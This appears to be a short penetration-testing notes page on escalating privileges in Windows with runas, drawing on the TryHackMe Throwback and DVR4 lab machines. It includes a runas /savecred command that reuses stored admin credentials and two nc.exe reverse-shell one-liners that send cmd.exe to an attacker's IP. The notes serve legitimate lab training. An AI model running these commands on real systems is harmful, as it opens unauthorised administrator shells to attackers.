# Runas

With some sort of credentials we are able to run this command to execute commands as the user we would like to.&#x20;

The TryHackMe Throwback network had an elevation of privileges through this.

When we invoked SEATBELT.exe we saw that there were some credentials that were stored in the machine for an administrator. With this we were able to elevate privileges by running the command line as him.&#x20;

![](<../../../../../.gitbook/assets/image (19).png>)

We ran the following command:&#x20;

```
runas /savecred /user:THROWBACK-PROD\admin-petersj "cmd.exe"
or we could if we already transferred nc.exe we could just do "C:\nc.exe our-ip our-port -e cmd.exe"
```

Now in the case that we find some sort of vulnerability like we found on DVR4, once we have access to other credentials and we spray them across all attack vectors and they don't work, we are going to try this technique.

```
runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.49.100 443"
Enter the password for DVR4\Administrator: 
```

![](<../../../../../.gitbook/assets/image (66).png>)
